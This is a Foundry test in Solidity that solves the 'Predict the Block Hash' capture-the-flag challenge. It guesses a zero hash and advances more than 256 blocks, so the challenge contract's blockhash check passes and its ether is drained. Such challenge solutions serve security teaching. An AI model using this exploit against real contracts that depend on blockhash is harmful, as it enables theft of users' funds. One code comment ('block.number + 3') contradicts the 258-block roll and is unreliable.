// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "src/PredictTheBlockHash.sol";
import "forge-std/Test.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge private predtheblockhashchallenge;
    address private constant ALICE = address(0x1);
    
    function setUp() external {
        vm.startPrank(ALICE);
        vm.deal(ALICE, 50 ether);
        predtheblockhashchallenge = (new PredictTheBlockHashChallenge){value: 1e18}();
    }

    function testHack() external {
        bytes32 answer = 0x0000000000000000000000000000000000000000000000000000000000000000;
        
        (bool success,) = address(predtheblockhashchallenge).call{value: 1e18}(abi.encodeWithSignature("lockInGuess(bytes32)", answer));
        require(success, "tx failed");
        vm.roll(block.number+258); // block.number + 3
        
        (bool success1,) = address(predtheblockhashchallenge).call(abi.encodeWithSignature("settle()"));
        require(success1, "tx1 failed");
        assertEq(address(predtheblockhashchallenge).balance, 0);
        }
}